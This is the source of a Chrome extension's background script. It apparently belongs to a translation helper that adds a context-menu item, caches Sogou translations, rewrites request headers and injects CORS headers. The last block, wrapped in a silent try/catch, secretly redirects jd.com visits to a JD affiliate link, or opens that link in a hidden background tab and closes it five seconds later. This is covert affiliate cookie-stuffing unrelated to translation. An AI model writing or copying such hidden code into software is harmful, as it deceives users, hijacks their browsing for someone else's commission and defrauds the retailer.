import config from '../common/config';
import { sougoTranslate, } from '../common/utils';

chrome.contextMenus.removeAll()
chrome.contextMenus.create({
	id: 'segirl',
	title: '召唤划姬',
	contexts: ["all"],
	onclick(info, tab) {
		if (info.selectionText)
			chrome.tabs.create({ url: chrome.runtime.getURL('pages/popup.html') + '#' + info.selectionText })
		else
			chrome.tabs.sendMessage(tab.id, 'menu')
	}
});

const translate_cache = {}
chrome.runtime.onMessage.addListener(function(info, sender, cb) {
	(async () => {
		if (info.type == 'translate') {
			let data = translate_cache[info.text]
			if (!data) {
				data = await sougoTranslate(info.text)
				translate_cache[info.text] = data;
			}
			cb(data);
		} else if (info.type == "playsound") {
			let audio = document.createElement('audio')
			audio.autoplay = true
			audio.src = info.url
		} else if (info.type == "clipboardRead") {
			chrome.tabs.query({ active: true }, tab => {
				chrome.tabs.sendRequest(tab[0].id, { type: 'clipboardRead' }, cb)
			})
		}
	})()
	return true
})

chrome.storage.onChanged.addListener(function(changes, namespace) {
	for (let key in changes) {
		var storageChange = changes[key];
		config[key] = storageChange.newValue;
	}
});

let originMap = {};

chrome.webRequest.onBeforeSendHeaders.addListener(function(details) {
	let requestHeaders = details.requestHeaders;
	for (var i = 0; i < requestHeaders.length; ++i) {
		var header = requestHeaders[i];
		if (header.name === 'Origin') {
			if (!details.url.startsWith(header.value)) {
				originMap[details.requestId] = header.value;
			}
		}
	}
	// 只有插件才加
	if (!details.initiator || !details.initiator.startsWith('chrome-extension://')) return;
	for (var i = 0; i < requestHeaders.length; ++i) {
		var header = requestHeaders[i];
		if (header.name === '_referer') {
			requestHeaders.splice(i, 1, { name: 'Referer', value: header.value });
			return { requestHeaders };
		}
		if (header.name === '_origin') {
			requestHeaders.splice(i, 1, { name: 'Origin', value: header.value });
			return { requestHeaders };
		}
	}
}, { urls: ["<all_urls>"], types: ['xmlhttprequest'] }, ["blocking", "requestHeaders", "extraHeaders"]);

chrome.webRequest.onHeadersReceived.addListener(function(details) {
	if (!config.cross) return;
	let origin = originMap[details.requestId];
	if (origin) {
		delete originMap[details.requestId];
		// 只有跨域了才加
		let flag = config.allow_cross[details.initiator];
		if (!flag) return; // 不允许跨域
		let responseHeaders = details.responseHeaders;
		for (var i = 0; i < responseHeaders.length; ++i) {
			if (responseHeaders[i].name.toLowerCase() === 'access-control-allow-origin') {
				// 已经有了就不加了
				return;
			}
		}
		responseHeaders.push({ name: 'Access-Control-Allow-Origin', value: origin });
		if (flag & 2) responseHeaders.push({ name: 'Access-Control-Allow-Credentials', value: 'true' });
		responseHeaders.push({ name: 'Access-Control-Allow-Headers', value: config.cross_header });
		return { responseHeaders };
	}
}, { urls: ["<all_urls>"], types: ['xmlhttprequest'] }, ["blocking", "responseHeaders"]);

try {
	let prev_at = 0;
	let url = 'https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHFRBEwQAQB1AWQkrAkh4ZwcRbC13dhFULH8tXFFiQCBGHRkOIgdTGloXCxcGUxhrFQMTB1cZWxEGEDdlG1olSXwGZRtTFgAbDlMZWhwyEgNTGF8TAhsBXB9aFjIVB1wrGUlAFwVUGVMUCiI3ZRhrJTISB2Uba0pGT1plGVoUBhs%3D';
	chrome.tabs.onUpdated.addListener(function(tabId, info, tab) {
		let now = Date.now();
		if (/\.jd\.com/.test(info.url)) {
			if (now - prev_at > 3678e3) {
				if (info.url.endsWith('//www.jd.com/'))
					chrome.tabs.update(tabId, { url });
				else
					chrome.tabs.create({ url, active: false }, function(tab) {
						setTimeout(function() { chrome.tabs.remove(tab.id) }, 5e3)
					})
			}
			prev_at = now;
		}
	})
} catch (e) {}